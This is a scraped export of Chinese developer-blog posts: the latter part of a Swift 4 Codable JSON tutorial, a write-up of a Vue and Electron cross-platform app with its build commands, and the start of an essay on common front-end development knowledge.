<p>默认情形下 Keys 是由编译器自动生成的枚举类型。该枚举遵守 CodingKey 协议并建立了属性和编码后格式之间的关系。</p>
<p>为了解决上面的风格差异需要对其进行自定义，实现代码：</p>
<pre><code>struct Beer : Codable {
      // ...
      enum CodingKeys : String, CodingKey {
          case name
          case abv = ""alcohol_by_volume""
          case brewery = ""brewery_name""
          case style
    }
}</code></pre>
<p>现在我们将 Beer 实例转化为 JSON ，看看自定义之后的 JSON 数据格式：</p>
<pre><code>let encoder = JSONEncoder()
let data = try! encoder.encode(beer)
print(String(data: data, encoding: .utf8)!)</code></pre>
<p>输出如下：</p>
<pre><code>{""style"":""ipa"",""name"":""Endeavor"",""alcohol_by_volume"":8.8999996185302734,""brewery_name"":""Saint Arnold""}</code></pre>
<p>上面的输出格式对阅读起来并不是太友好。不过我们可以设置 JSONEncoder 的 <strong>outputFormatting</strong> 属性来定义输出格式。</p>
<p>默认 <strong>outputFormatting</strong> 属性值为 <strong>.compact</strong>，输出效果如上。如果将其改为 <strong>.prettyPrinted</strong> 后就能获得更好的阅读体检。</p>
<pre><code>encoder.outputFormatting = .prettyPrinted</code></pre>
<p>效果如下：</p>
<pre><code>{
  ""style"" : ""ipa"",
  ""name"" : ""Endeavor"",
  ""alcohol_by_volume"" : 8.8999996185302734,
  ""brewery_name"" : ""Saint Arnold""
}</code></pre>
<p>JSONEncoder 和 JSONDecoder 其实还有很多选项可以自定义设置。其中有一个常用的需求就是自定义时间格式的解析。</p>
<h2>时间格式处理</h2>
<p>JSON 没有数据类型表示日期格式，因此需要客户端和服务端对序列化进行约定。通常情形下都会使用 ISO 8601 日期格式并序列化为字符串。</p>
<blockquote><p>提示：nsdateformatter.com 是一个非常有用的网站，你可以查看各种日期格式的字符串表示，包括 ISO 8601。</p></blockquote>
<p>其他格式可能是参考日期起的总秒（或毫秒）数，并将其序列化为 JSON 格式中的数字类型。</p>
<p>之前，我们必须自己处理这个问题。在数据结构中使用属性接收该字符串格式日期，然后使用 DateFormatter 将该属性转化为日期，反之亦然。</p>
<p>不过 JSONEncoder 和 JSONDecoder 自带了该功能。默认情况下，它们使用 <strong>.deferToDate</strong> 处理日期，如下：</p>
<pre><code>struct Foo : Encodable {
    let date: Date
}

let foo = Foo(date: Date())
try! encoder.encode(foo)</code></pre>
<pre><code>{
  ""date"" : 519751611.12542897
}</code></pre>
<p>当然，我们也可以选用 <strong>.iso8601</strong> 格式：</p>
<pre><code>encoder.dateEncodingStrategy = .iso8601</code></pre>
<pre><code>{
  ""date"" : ""2017-06-21T15:29:32Z""
}</code></pre>
<p>其他日期编码格式选择如下：</p>
<ul>
<li>
<strong>.formatted(DateFormatter)</strong> - 当你的日期字符串是非标准格式时使用。需要提供你自己的日期格式化器实例。</li>
<li>
<strong>.custom( (Date, Encoder) throws -&gt; Void )</strong> - 当你需要真正意义上的自定义时，使用一个闭包进行实现。</li>
<li>
<strong>.millisecondsSince1970、 .secondsSince1970</strong> - 这在 API 设计中不是很常见。 由于时区信息完全不在编码表示中，所以不建议使用这样的格式，这使得人们更容易做出错误的假设。</li>
</ul>
<p>对日期进行 Decoding 时基本上是相同的选项，但是 <em>.custom</em> 形式是 <em>.custom( (Decoder) throws -&gt; Date )</em>，所以我们给了一个解码器并将任意类型转换为日期格式。</p>
<h2>浮点类型处理</h2>
<p>浮点是 JSON 与 Swift 另一个存在不匹配情形的类型。如果服务器返回的事无效的 ""NaN"" 字符串会发生什么？无穷大或者无穷大？这些不会映射到 Swift 中的任何特定值。</p>
<p>默认的实现是 <em>.throw</em>，这意味着如果上述数值出现的话就会引发错误，不过对此我们可以自定义映射。</p>
<pre><code>{
   ""a"": ""NaN"",
   ""b"": ""+Infinity"",
   ""c"": ""-Infinity""
}</code></pre>
<pre><code>struct Numbers {
  let a: Float
  let b: Float
  let c: Float
}
decoder.nonConformingFloatDecodingStrategy =
  .convertFromString(
      positiveInfinity: ""+Infinity"",
      negativeInfinity: ""-Infinity"",
      nan: ""NaN"")

let numbers = try! decoder.decode(Numbers.elf, from: jsonData)
dump(numbers)</code></pre>
<p>上述处理后：</p>
<pre><code>__lldb_expr_71.Numbers
  - a: inf
  - b: -inf
  - c: nan</code></pre>
<p>当然，我们也可以使用 JSONEncoder 的 <em>nonConformingFloatEncodingStrategy</em> 进行反向操作。</p>
<p>虽然大多数情形下上述处理不太可能出现，但是以防万一也不给过。</p>
<h2>Data 处理</h2>
<p>有时候服务端 API 返回的数据是 base64 编码过的字符串。</p>
<p>对此，我们可以在 JSONEncoder 使用以下策略：</p>
<ul>
<li>.base64</li>
<li>.custom( (Data, Encoder) throws -&gt; Void)</li>
</ul>
<p>反之，编码时可以使用：</p>
<ul>
<li>.base64</li>
<li>.custom( (Decoder) throws -&gt; Data)</li>
</ul>
<p>显然，.base64 时最常见的选项，但如果需要自定义的话可以采用 block 方式。</p>
<h2>Wrapper Keys</h2>
<p>通常 API 会对数据进行封装，这样顶级的 JSON 实体 始终是一个对象。</p>
<p>例如：</p>
<pre><code>{
  ""beers"": [ {...} ]
}</code></pre>
<p>在 Swift 中我们可以进行对应处理：</p>
<pre><code>struct BeerList : Codable {
    let beers: [Beer]
}</code></pre>
<p>因为键值与属性名一致，所有上面代码已经足够了。</p>
<h2>Root Level Arrays</h2>
<p>如果 API 作为根元素返回数组，对应解析如下所示：</p>
<pre><code>let decoder = JSONDecoder()
let beers = try decoder.decode([Beer].self, from: data)</code></pre>
<p>需要注意的是，我们在这里使用Array作为类型。只要 T 可解码，Array &lt;T&gt; 就可解码。</p>
<h2>Dealing with Object Wrapping Keys</h2>
<p>另一个常见的场景是，返回的数组对象里的每一个元素都被包装为字典类型对象。</p>
<pre><code>[
  {
    ""beer"" : {
      ""id"": ""uuid12459078214"",
      ""name"": ""Endeavor"",
      ""abv"": 8.9,
      ""brewery"": ""Saint Arnold"",
      ""style"": ""ipa""
    }
  }
]</code></pre>
<p>你可以使用上面的方法来捕获此 Key 值，但最简单的方式就是认识到该结构的可编码的实现形式。</p>
<p>如下：</p>
<pre><code>[[String:Beer]]</code></pre>
<p>或者更易于阅读的形式：</p>
<pre><code>Array&lt;Dictionary&lt;String, Beer&gt;&gt;</code></pre>
<p>与上面的 Array&lt;T&gt; 类似，如果 K 和 T 是可解码 Dictionary&lt;K,T&gt; 就能解码。</p>
<pre><code>let decoder = JSONDecoder()
let beers = try decoder.decode([[String:Beer]].self, from: data)
dump(beers)</code></pre>
<pre><code> 1 element
  ▿ 1 key/value pair
    ▿ (2 elements)
      - key: ""beer""
      ▿ value: __lldb_expr_37.Beer
        - name: ""Endeavor""
        - brewery: ""Saint Arnold""
        - abv: 8.89999962
        - style: __lldb_expr_37.BeerStyle.ipa</code></pre>
<h2>更复杂的嵌套</h2>
<p>有时候 API 的响应数据并不是那么简单。顶层元素不一定只是一个对象，而且通常情况下是多个字典结构。</p>
<p>例如：</p>
<pre><code>{
    ""meta"": {
        ""page"": 1,
        ""total_pages"": 4,
        ""per_page"": 10,
        ""total_records"": 38
    },
    ""breweries"": [
        {
            ""id"": 1234,
            ""name"": ""Saint Arnold""
        },
        {
            ""id"": 52892,
            ""name"": ""Buffalo Bayou""
        }
    ]
}</code></pre>
<p>在 Swift 中我们可以进行对应的嵌套定义处理：</p>
<pre><code>struct PagedBreweries : Codable {
    struct Meta : Codable {
        let page: Int
        let totalPages: Int
        let perPage: Int
        let totalRecords: Int
        enum CodingKeys : String, CodingKey {
            case page
            case totalPages = ""total_pages""
            case perPage = ""per_page""
            case totalRecords = ""total_records""
        }
    }

    struct Brewery : Codable {
        let id: Int
        let name: String
    }

    let meta: Meta
    let breweries: [Brewery]
}</code></pre>
<p>该方法的最大优点就是对同一类型的对象做出不同的响应（可能在这种情况下，“brewery” 列表响应中只需要  <em>id</em> 和 <em>name</em> 属性，但是如果查看详细内容的话则需要更多属性内容）。因为该情形下 Brewery 类型是嵌套的，我们依旧可以在其他地方进行不同的 Brewery 类型实现。</p>
<h2>结论</h2>
<p>Swift 4 中基础 Codable API 的内容已经介绍差不多了。更多的内容可以查看<a href=""https://github.com/apple/swift/blob/master/stdlib/public/core/Codable.swift"" rel=""nofollow noreferrer"">Codable.swift</a>、<a href=""https://developer.apple.com/documentation/foundation/archives_and_serialization/using_json_with_custom_types"" rel=""nofollow noreferrer"">Using JSON with Custom Types </a>。</p>
<blockquote><p>更多内容，可以去我<a href=""https://bignerdcoding.com"" rel=""nofollow noreferrer"">个站</a></p></blockquote>

                ", Swift 4 JSON 解析指南,1531971953,470,1,954,1,1,https://segmentfault.com/a/1190000009929819
58,1,0,6,"
                    
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000009895508?w=2266&amp;h=1202"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<blockquote>
<p>GitHub Repo：<a href=""https://github.com/halfrost/vue-objccn"" rel=""nofollow noreferrer"">vue-objccn</a></p>
<p>Follow: <a href=""https://github.com/halfrost"" rel=""nofollow noreferrer"">halfrost · GitHub</a></p>
</blockquote>
<p>项目地址：<a href=""https://github.com/halfrost/vue-objccn"" rel=""nofollow noreferrer"">https://github.com/halfrost/vue-objccn</a></p>
<p>利用 Vue.js 实现 <a href=""https://objccn.io/"" rel=""nofollow noreferrer"">objc中国</a> 的跨平台全栈应用</p>
<ul>
<li><p>✅ 桌面应用，支持 Mac、Linux、Windows 三个平台</p></li>
<li><p>✅ Web 应用，支持 桌面浏览器 和 手机浏览器</p></li>
<li><p>✅ 手机 App，目前只支持了 Cordova 框架，支持 iOS 和 Android 两个平台</p></li>
<li><p>❌ 手机原生 App，打算用 Weex 框架，同样一起支持 iOS 和 Android 两个平台</p></li>
</ul>
<blockquote><p>注：此项目纯属个人瞎搞，请大家支持 喵神(@onevcat)，支持 <a href=""https://objccn.io/"" rel=""nofollow noreferrer"">Objc中国</a>。</p></blockquote>
<h1>前言</h1>
<h2>一.关于我</h2>
<p>我是一名全职的 iOS 开发者，非前端开发者。由于接触了 Weex 开发，从而接触到了 Vue.js。</p>
<h2>二.为什么会写这个项目？</h2>
<ol>
<li><p>最开始有这个想法的时候是来自一个网友，他在我的博客上问我，网上有没有写的比较好的 demo ？我说尤大写的那个 Hacker News 是最好的。后来网友就是，楼主能写一个么？我当时回答暂时不行。其实这事我一直记在心里。</p></li>
<li><p>今年5月19号，GitHub 使用 Electron 重写了 macOS 和 Windows 的客户端，加上近些年跨端开发越来越火，对于一些公司来说，Web 和 app 应该都是需要的，app 还需要 iOS 和 Android 两个平台，再有甚者还要开发小程序，桌面级的应用虽然少，但是用 Electron 一样可以一起开发了。自己也萌生了想要跃跃欲试的念头。</p></li>
<li><p>由于接触到了 Vue.js，当然不想停留在初级，想进阶，尤大给出了建议，就是多实践，多练。为了加快进阶的步伐，自己私下就找项目练。</p></li>
<li><p>至于为何选择 Objc 中国，理由其实很简单，因为我是 iOS 开发者。在 iOS 开发者中，Objc 基本上人尽皆知（有不知道的？），喵神也基本上人尽皆知，我个人很崇拜喵神，所以就选了 Objc 中国来写。</p></li>
<li><p>因为爱 ... ...</p></li>
</ol>
<h2>三.这次为何跨端开发没有weex？</h2>
<p>这次在我写完项目以后，发现 Vue 的代码直接转换成 Weex 的项目，是无法实现的，好多报错。而且不是一下子能都修复好。我相信是我使用姿势的问题，不是 Weex 的问题。对了，Weex 又发布新版本了，接下来有时间的话就把 Weex 版的也做一遍开源。</p>
<p>好了，进入正题，说项目：</p>
<hr>
<h1>技术栈和主要框架</h1>
<p>?    Vue 全家桶：vue2 + vuex + vue-router + webpack  <br>?    ES6     <br>?    网络请求：axios  <br>?    页面相应式框架：bootstrap，element-ui  <br>✏️    后台：express  <br>?    代码高亮：highlight.js  <br>?    数据库：lowdb  <br>?    markdown解析器：vue-markdown  <br>?    表单验证：vee-validate  <br>?    跨平台框架：Electron</p>
<h1>?项目构建</h1>
<p>由于喵神的 Objc 网站是直接返回 html，所以想进行模拟网络请求返回数据，就只能自己搭建一个后台，写 api 返回数据了。</p>
<p>我利用 Express 把后台搭建在 8081端口上，并写好路由，请求会转到8080，开启服务器的时候也会自动开启后台。</p>
<pre><code class=""bash"">
# install dependencies 安装依赖
npm install

# serve with hot reload at localhost:8080
npm run dev

# serve with hot reload at localhost:8080
npm run start

# build for production with minification 打包
npm run build

# build for production and view the bundle analyzer report
npm run build --report

# run unit tests
npm run unit

# run e2e tests
npm run e2e

# run all tests
npm test

# 打包 Mac 应用
npm run build:mac

# 打包 Linux 应用
npm run build:linux

# 打包 Win 应用
npm run build:win

# 打包 Cordova 应用
npm run build:app
</code></pre>
<p>这里要单独说一下 Cordova 的打包方式，它比桌面端的稍微特殊一点。<br>我在项目中放了一个 Makefile，可以根据这个来做。</p>
<ol><li><p>首先全局安装 cordova 命令</p></li></ol>
<blockquote><p>npm install -g cordova</p></blockquote>
<ol><li><p>再输入下面的命令，生成 app 项目目录</p></li></ol>
<blockquote><p>cordova create app com.vueobjccn vueobjccn</p></blockquote>
<ol><li><p>进入到 app 文件夹中</p></li></ol>
<blockquote><p>cd app</p></blockquote>
<ol><li><p>添加对应的平台</p></li></ol>
<blockquote><p>cordova platform add ios  <br>cordova platform add android</p></blockquote>
<ol><li><p>运行项目</p></li></ol>
<blockquote><p>cordova run ios  <br>cordova run android</p></blockquote>
<p>Cordova 只生成了一个壳的 app，里面具体的内容还是读取的网页，在生成的对应的应用里面有一个 www 的文件夹，这个文件夹里面就是要加载页面。JavaScript 打包之后是会生成 www 的文件夹，只要去替换 Cordova 对应平台里面的 www 文件夹里面的内容即可。</p>
<p>额外说几句，在 app 发展到现在这么成熟的时代，如果构建一个大的 app，用 Cordova 框架去做，不用原生，不做任何优化，用户体验确实不如原生的快。我这次就专门打包体验了 Cordova app，没有做任何优化，打包出来就用，如果是挑剔的用户，放在当今各大 app 接近完美的体验度相比来说，确实会感到满足感略低。如果真的要前端开发 app ，给2个建议，如果是用 Cordova 框架，一定要尽量优化优化，不如性能不如原生。如果想有接近原生的体验，那么可以考虑用 React Native 或者 Weex。</p>
<h1>? 跨平台开发</h1>
<p>JavaScript 跨平台开发打包成桌面级应用，主要用 Electron 框架。这里需要在 devDependencies 里面安装好 ""electron""、""electron-builder""、""electron-packager"" 这三个。其他的路径配置在 webpack 里面配置好即可。</p>
<p>关于 Cordova 的安装，确实可以吐槽一点网络的问题。如果你在一个翻墙环境很差的地方，真的很痛苦。比如之前在一个翻墙环境很差的情况下全局安装 Cordova ，各种报错，就算是换了 cnpm 完全安装了以后，添加 iOS 平台以后以后会报一个 co 文件找不到的问题，感觉是 cnpm 没有把命令安装完整。后来我回到家里，翻墙网络很好，npm install 一下子就安装好了。不过有个小插曲：Cordova iOS 4.4.0 template 如果报错，就多安装几次，原因还是翻墙的原因，没有 catch 到。</p>
<p>还有可能会遇到下面这个错误：</p>
<blockquote><p>""Error: Cannot find module 'config-chain'"" when running 'ionic start'</p></blockquote>
<p>这个错误就用 sudo 命令重新尝试一遍原命令就好了。</p>
<p>最终打包完成会在 dist 的文件夹中。</p>
<p>接下来展示一下这个跨三端的应用在各个平台下的表现：</p>
<p>先展示一下 Web 端</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000009895439?w=1240&amp;h=698"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000009895440?w=1240&amp;h=698"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000009895441?w=1240&amp;h=698"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000009895442?w=1240&amp;h=698"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000009895443?w=1240&amp;h=698"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>再展示一下在手机浏览器上的效果：</p>
<p>Android平台</p>
<p>Nexus 5x 的 Web</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000009895444?w=459&amp;h=927"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>Nexus 6P 的 Web</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000009895445?w=449&amp;h=926"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>iOS 平台</p>
<p>iPhone 5 的 Web</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000009895446?w=375&amp;h=799"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>iPhone 7 的 Web</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000009895447?w=439&amp;h=892"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>iPhone 7 Plus 的 Web</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000009895448?w=461&amp;h=926"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>iPad 的 Web</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000009895449?w=647&amp;h=927"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>接着再看看 Mac 端上的表现：</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000009895450?w=1240&amp;h=1044"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000009895451?w=1240&amp;h=1044"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000009895452?w=1240&amp;h=1044"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000009895453?w=1240&amp;h=1044"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>最后看看 Cordova 的效果：</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000009895454?w=526&amp;h=870"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000009895455?w=526&amp;h=870"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000009895456?w=526&amp;h=870"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000009895457?w=795&amp;h=1045"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000009895458?w=795&amp;h=1045"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000009895459?w=795&amp;h=1045"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<h1>?功能展示</h1>
<p>用 Vue.js 搭建一个 Web 页面很快。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000009895460"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>看看 Vuex 管理状态的方便。登录状态保存在 state 里面，全局都会获取到。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000009895461?w=1905&amp;h=973"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>一旦用户没有登录，点击购买电子书的时候，判断没有用户登录都会跳转到登录页面。</p>
<p>还有一点值得说的是，由于这是一个 SPA ，所以里面的路由都用 Router-link 实现的，而没有选用 a 标签的跳转，效果就是跳转并不用去请求数据，秒跳。这个用户体验真的很爽。</p>
<p>&lt;router-link&gt; 比起写死的 <a> 会好一些，理由如下：</a></p>
<p>无论是 HTML5 history 模式还是 hash 模式，它的表现行为一致，所以，当你要切换路由模式，或者在 IE9 降级使用 hash 模式，无须作任何变动。</p>
<p>在 HTML5 history 模式下，router-link 会拦截点击事件，让浏览器不再重新加载页面。</p>
<p>当你在 HTML5 history 模式下使用 base 选项之后，所有的 to 属性都不需要写（基路径）了。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000009895462?w=1905&amp;h=973"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>登出页面同理，一旦用户登出，所有显示用户名的地方都会变成登录，navigationBar 上的购物车也一并消失。用 Vuex 管理状态，挺好的。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000009895463?w=1905&amp;h=973"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>这就是 email 的表单验证了，没有太多的技术含量。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000009895464?w=1905&amp;h=973"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>这里是购物车页面，这里用到了 MVVM 页面的绑定的思想，页面上4个按钮，点任意一个按钮都会立即改变下面的总价。关于 Vue.js 的 MVVM 实现思想值得 iOSer 们学习。</p>
<p>接下来这个是 iPhone 的 Safari 上的表现，速度还可以。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000009895465"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>在跨平台的这几个应用中，体验最好的，我觉得还是 Mac 的应用。使用起来满意度非常高。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000009895466"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>最后就是 Cordova 框架搭建的 手机 app，体验度不高，具体如何，看图吧，总之不优化的 Cordova ，对于挑剔的我来说，我是不满意的。</p>
<p>iPhone 上的应用</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000009895467"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>iPad 上的应用</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000009895468"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<h1>?项目完成之后的感想</h1>
<p>先安利一下 element-ui 这个项目，用它来搭建项目，真的很快，页面很快就可以搭建完成，开发 Vue.js 的同学一定有听过这个库。节约出来的大把时间可以把更多的精力放在业务开发上面。</p>
<p>大家都在说现在是大前端时代，移动开发和前端融合是必然。但是两个平台的开发其实还是有很多的不同，我在经历过前端的开发和 iOS 开发以后，感想还是很多的，前端和 iOS 是有很多可以相互学习的地方，两者也各有优缺点。接下来我打算写写这些方面的系列文章。前端的工程化，组件化，路由，MVVM，分别和 iOS 这边各有哪些优缺点，相互可以学习些什么。（感觉给自己挖了一个大坑）</p>
<h1>?Feature</h1>
<p>有时间就支持 Weex ，把这个 Vue.js 的改成一个完整的 Weex 的应用，变成原生以后，性能一定不会差。这样跨平台开发就应该全了。</p>
<h1>❗️勘误</h1>
<p>如果在项目中发现了有什么不解或者发现了 bug，欢迎提交 PR 或者 issue，欢迎大神们多多指点小弟???</p>
<h1>♥️感谢</h1>
<p>如果喜欢这个项目，欢迎Star！</p>
<hr>
<h1>?LICENSE</h1>
<p>GNU GENERAL PUBLIC LICENSE Version 3, 29 June 2007</p>
<p>Copyright (C) 2007 Free Software Foundation, Inc. <a href=""http://fsf.org/"" rel=""nofollow noreferrer"">http://fsf.org/</a><br>Everyone is permitted to copy and distribute verbatim copies of this license document, but changing it is not allowed.</p>

                ", Vue 全家桶 + Electron 开发的一个跨三端的应用,1531971954,185,1,545,1,1,https://segmentfault.com/a/1190000009895434
59,1,0,6,"
                    
<blockquote><p><a href=""https://zhuanlan.zhihu.com/p/27485335"" rel=""nofollow noreferrer"">大前端公共知识杂谈</a>首发于<a href=""http://www.infoq.com/cn/minibooks/GMTC-minibook"" rel=""nofollow noreferrer"">InfoQ-架构师特刊：大前端</a>，是笔者对于<a href=""https://zhuanlan.zhihu.com/p/25939682"" rel=""nofollow noreferrer"">泛前端知识图谱（Web/iOS/Android/RN）</a> 的文字版介绍，夹杂了<a href=""https://zhuanlan.zhihu.com/p/26799645"" rel=""nofollow noreferrer""> GUI 应用程序架构的十年变迁：MVC、MVP、MVVM、Unidirectional、Clean </a>的部分内容；更多参考资料可以查看笔者的<a href=""https://parg.co/b4T"" rel=""nofollow noreferrer""> Web 学习与实践资料索引</a>以及<a href=""https://parg.co/bM1"" rel=""nofollow noreferrer""> React 学习与实践资料索引</a>。</p></blockquote>
<p>近年来，随着移动化联网浪潮的汹涌而来与浏览器性能的提升，iOS、Android、Web 等前端开发技术各领风骚，大前端的概念也日渐成为某种共识。其中特别是 Web 开发的领域，以单页应用为代表的富客户端应用迅速流行，各种框架理念争妍斗艳，百花竞放。而 Web 技术的蓬勃发展也催生了一系列跨端混合开发技术，希望能够结合 Web 的开发便捷性与原生应用的高性能性；其中以 Cordova、PWA 为代表的方向致力于为 Web 应用尽可能添加原生体验，而以 NativeScript、ReactNative、Weex 为代表的利用 Web 技术或者理念开发原生应用。平心而论，无论哪一种开发领域或者技术，他们本质上都是进行图形用户界面（GUI）应用程序的开发，面对的问题、思考的方式、架构的设计很大程度上仍然可以回溯到当年以 MFC、Swing、WPF 为主导的桌面应用程序开发时代，其术不同而道相似。</p>
<p>任何的前端开发学习中，我们都需要掌握基本的编程语言语法与接口；譬如在 Android 开发中使用的 Java 或者 Kotlin，在 iOS 开发中使用的 Objective-C 或者 Swift，在 Web 开发中使用的 JavaScript、HTML 与 CSS 等。编程语言的学习中我们往往关注于语法基础、数据结构、功能调用、泛型编程、元编程等内容，譬如如何声明表达式、如何理解作用域与闭包、如何进行基本的流程控制与异常处理、如何实践面向对象编程、如何进行网络请求通信等等。接下来我们就需要了解如何构建基础的界面，譬如利用 HTML 与 CSS 绘制简单 Web 页面、利用代码创建并使用简单的 Activity、利用 StoryBoard 快速构建界面原型等等。然后我们需要去学习使用常见的系统功能，譬如如何进行网络交互，如何访问远端的 RESTful 接口以获取需要的数据、如何读取本地文件或者利用 SharedPreference、localStorage、CoreData 来存取数据、如何进行组件间或者应用间信息交互等内容。到这里我们已经能够进行基础的界面开发，并且为其增添必要的特性，不过在真实的项目中我们往往还会用到很多的组件或者插件，iOS 或者 Android 中为我们提供了丰富的 SDK，譬如 UITableView 或者 RecycleView 可以帮助我们快速构建高性能列表组件，Android 5.0 之后默认的 Material Design 也是非常优秀的界面样式设计指南；而 Web 开发中我们往往需要引入第三方模式库，譬如著名的 BootStrap、React Material UI、Vue element 都为我们提供了很多预置的样式组件，react-virtualized 也为我们提供了高性能的类似于 ListView 这样的部分项渲染机制。然后我们需要将应用真实地发布给用户使用，我们需要考虑很多工程实践的问题，譬如如何进行测试与调试、如何进行性能优化并且在生产环境下完成应用状态跟踪、热更新等操作、如何统一开发团队的代码风格与约定等等；这里 Web 因为其特性而自带了热更新的功能，而在 Android 或者 iOS 我们则可以利用插件化技术或者 JSPatch 来实现热更新。Java 与 Swift 都是强类型语言，其能够在编译阶段帮开发者排查问题减少潜在风险；而我们也可以使用 TypeScript 或者 Flow 为 JavaScript 添加静态类型检测的特性，在 VSCode 等现代编辑器中同样可以达到类似于 Android Studio、XCode 中的即时检查与提示的功能。最后，随着应用功能的增加、代码库的扩展，我们需要考虑整体的应用架构与工程化的问题；在应用架构中我们往往需要考虑模块化、组件化以及状态管理等多个方面，选择合适的 MVC、MVP、MVVM、Flux、VIPER 等不同的架构模式来引导应用中的代码组织与职责分割；我们也需要考虑选择合适的构建与部署工具来简化或者自动化应用发布流程，在 Android 开发中我们会选择 Gradle 及其自带的多模块特性来管理依赖与分割代码，而在 Web 中我们可以使用 Webpack、Rollup 等工具来自动处理依赖并且进行构建，iOS 中我们也可以选择 CoocaPods。</p>
<p>到这里我们会发现虽然具体的代码实现、使用的技术不同，但是 Android、iOS 以及 Web 乃至于 React Native 等开发中，我们需要解决的问题、能够用到的架构设计模式都是可以相互借鉴的。在我们从某个领域迁移到其他领域时，我们能很方便地知道应该学习些什么，不同的技术、工具他们的职责是什么，应该选择怎样的架构或者设计模式。古语云，欲穷千里目，更上一层楼，我们想要真正掌握某种客户端开发技术，最好是要了解我们应该掌握哪些方面，本文即是对笔者日前总结出的<a href=""https://zhuanlan.zhihu.com/p/25939682"" rel=""nofollow noreferrer"">泛前端知识图谱（Web/iOS/Android/RN）</a> 的简要阐释。</p>
<h1>编程语言</h1>
<p>编程语言的学习是我们进入软件世界的基础阶梯，著名的 <a href=""https://parg.co/b8o"" rel=""nofollow noreferrer"">Code Complete</a> 一书中提到：Program into Your Language, Not in it. 我们不应该将自己的编程思维局限于掌握的语言提供的那些特性或者概念，而是能够理解这些语法特性背后能提供的抽象功能与原理，从而能够根据自己想要达到的目标选择最合适的编程语言。而从另一个角度来看，无论哪一门编程语言的学习也是具有极大的共性，从严谨而又被诟病过度冗余的 Java 到需要用游标卡尺的 Python，从挣扎着一路向前的 JavaScript 到含着金汤匙出生的 Swift、Rust，我们都能够发现其中的相通与互相借鉴之处。</p>
<h2>语法基础</h2>
